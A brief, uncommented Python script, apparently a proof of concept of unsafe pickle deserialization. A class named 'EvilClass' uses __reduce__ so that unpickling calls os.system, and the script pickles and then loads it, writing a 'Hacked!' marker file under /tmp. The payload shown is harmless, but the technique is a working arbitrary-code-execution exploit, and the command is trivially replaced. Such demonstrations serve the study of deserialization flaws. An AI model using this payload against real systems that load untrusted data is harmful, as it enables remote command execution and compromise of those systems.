import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!" > /tmp/hacked.txt',))

def serialize_and_write(obj, filename):
    with open(filename, 'wb') as f:
        pickle.dump(obj, f)

def read_and_deserialize(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

serialize_and_write(EvilClass(), '/tmp/malicious.pkl')
read_and_deserialize('/tmp/malicious.pkl')
